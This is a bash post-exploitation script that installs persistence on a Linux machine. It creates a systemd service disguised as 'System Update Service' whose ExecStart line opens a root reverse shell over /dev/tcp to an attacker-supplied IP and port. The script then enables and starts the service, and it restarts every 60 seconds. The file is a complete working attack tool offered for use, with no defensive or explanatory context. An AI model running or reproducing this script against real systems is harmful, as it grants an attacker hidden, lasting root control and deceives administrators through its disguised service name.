#!/bin/bash
# ==========================================
# Persistence via Systemd Service
# ==========================================
# Usage: sudo ./persistence_systemd.sh <ATTACKER_IP> <PORT>
# Example: sudo ./persistence_systemd.sh 192.168.1.100 4444
# ==========================================

set -e

ATTACKER_IP="$1"
PORT="$2"
SERVICE_NAME="system-update"  # Innocent-looking name

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Check root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] Please run as root (sudo)${NC}"
    exit 1
fi

# Check arguments
if [ -z "$ATTACKER_IP" ] || [ -z "$PORT" ]; then
    echo -e "${RED}Usage: sudo $0 <ATTACKER_IP> <PORT>${NC}"
    echo -e "${YELLOW}Example: sudo $0 192.168.1.100 4444${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Creating systemd service: $SERVICE_NAME${NC}"

# Create service file
cat > "/etc/systemd/system/${SERVICE_NAME}.service" << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF

echo -e "${GREEN}[+] Service file created${NC}"

# Reload and enable
systemctl daemon-reload
systemctl enable "${SERVICE_NAME}.service"
systemctl start "${SERVICE_NAME}.service"

echo -e "${GREEN}[+] Service enabled and started${NC}"
echo -e "${GREEN}[+] Status:${NC}"
systemctl status "${SERVICE_NAME}.service" --no-pager
